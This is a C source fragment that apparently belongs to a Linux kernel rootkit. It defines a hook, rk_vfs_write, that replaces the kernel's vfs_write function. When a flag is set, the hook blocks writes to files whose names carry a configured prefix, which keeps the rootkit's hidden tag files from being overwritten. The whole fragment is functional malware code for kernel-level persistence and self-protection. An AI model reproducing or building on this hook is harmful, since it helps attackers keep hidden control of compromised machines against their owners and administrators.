#ifdef CONFIG_NO_WRITE
#include "file.h"

int no_write = 0;

ssize_t (*orig_vfs_write)(struct file *file, const char __user *buf, size_t count, loff_t *pos) ;

// no write on some file to avoid our hidden tag overwrite
ssize_t rk_vfs_write(struct file *file, const char __user *buf, size_t count, loff_t *pos) 
{
    // so cost operation, we will optimised this function here
    //char *path = *path_from_fd_or_from_file_struct(-1, file);
	char * pathname = file->f_path.dentry->d_iname;
    
    if (strstr(pathname, CONFIG_RK_NO_WRITE_FILE_PREFIX) && no_write)
        return -ETXTBSY;
    return orig_vfs_write(file, buf, count, pos);
}
#endif